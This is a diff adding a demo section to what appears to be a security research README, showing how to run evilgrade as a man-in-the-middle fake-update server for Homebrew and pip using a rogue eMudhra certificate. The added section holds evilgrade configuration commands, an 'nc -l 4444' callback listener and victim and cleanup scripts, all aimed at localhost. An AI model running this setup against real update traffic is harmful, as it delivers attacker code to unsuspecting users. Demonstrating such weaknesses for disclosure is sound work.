@@ -70,6 +70,57 @@ git: Apple git defaults to Secure Transport (rejects); an OpenSSL-backed git, or
 eMudhra cert. A clone is transport tampering; RCE follows from a build step or a
 malicious submodule.
 
+## Two-console demo (evilgrade in one, victim in another)
+
+This is the cleanest way to show it live: evilgrade stays up in console A with
+its request log visible; you fire the victim from console B.
+
+**Console A — evilgrade (stays running):**
+```sh
+# wrapper = system perl + sanitized env (avoids the perl ABI mismatch)
+./demo/emudhra_mitm/console.sh 9443       # or no arg + sudo for :443
+# then inside the shell:
+set sslport 9443
+set sslcert certs/emudhra_mitm
+configure homebrew_update
+set lhost 127.0.0.1
+set lport 4444
+set enable 1
+configure
+# (enable pypi_update too if you want the pip case)
+configure pypi_update
+set enable 1
+configure
+start
+```
+
+**Console C (optional) — callback listener:**
+```sh
+nc -l 4444
+```
+
+**Console B — victim (does NOT touch evilgrade):**
+```sh
+./demo/emudhra_mitm/victim_brew.sh 9443    # Homebrew case
+./demo/emudhra_mitm/victim_pip.sh  9443    # pip case
+```
+Pass the same port you gave evilgrade (omit for 443).
+
+### Re-running / cleanup
+
+- **victim_*.sh** can be re-run as many times as you want — they don't start or
+  stop evilgrade, they just delete their own `/tmp/OWNED_BY_*` and re-fire.
+- The **run_*.sh** (standalone) now free their target port automatically before
+  starting, so back-to-back runs work.
+- If a run ever reports **"FAILED to bind"** or the victim gets **HTTP 000 /
+  Empty reply**, a stale forked webserver is holding the port. Run:
+  ```sh
+  ./demo/emudhra_mitm/cleanup.sh
+  ```
+  It kills serve.pl + forked webservers + the `nc` listener and removes the
+  proof files. (It also stops an interactive evilgrade console, so only run it
+  when you want everything down.)
+
 ## Non-interactive check (no TTY needed)
 
 evilgrade's shell is `Term::Shell` and needs a real terminal. To verify the
